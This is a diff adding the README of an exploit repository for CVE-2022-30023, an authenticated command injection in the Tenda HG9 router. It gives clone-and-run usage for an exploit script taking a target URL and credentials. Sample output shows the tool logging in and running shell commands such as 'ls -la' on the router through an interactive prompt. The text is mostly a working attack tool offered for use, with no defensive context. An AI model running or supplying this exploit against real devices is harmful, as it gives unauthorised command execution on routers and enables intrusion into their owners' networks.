@@ -1,0 +1,25 @@
+# CVE-2022-30023
+
+Authenticated Command Injection on Tenda HG9 Router
+
+#### Usage
+```
+git clone https://github.com/Haniwa0x01/CVE-2022-30023
+cd CVE-2022-30023
+python exploit.py -u http://target -U "user" -P "password"
+```
+
+#### Example
+
+```
+pc@pc-note:~/CVE-2022-30023/$ python3 exploit.py -u "http://10.0.0.1" -U "admin" -P "admin"
+[!]: Logged!
+[CMD]: ls -la
+
+drwxrwxr-x    3 admin    root            54 Jan 25  2021 .
+drwxrwxr-x    3 admin    root            28 Jan 25  2021 ..
+-rwxrwxr-x    1 admin    root          6306 Jan 25  2021 boa.conf
+drwxrwxr-x    6 admin    root          5129 Jan 25  2021 web
+
+[CMD]:
+```
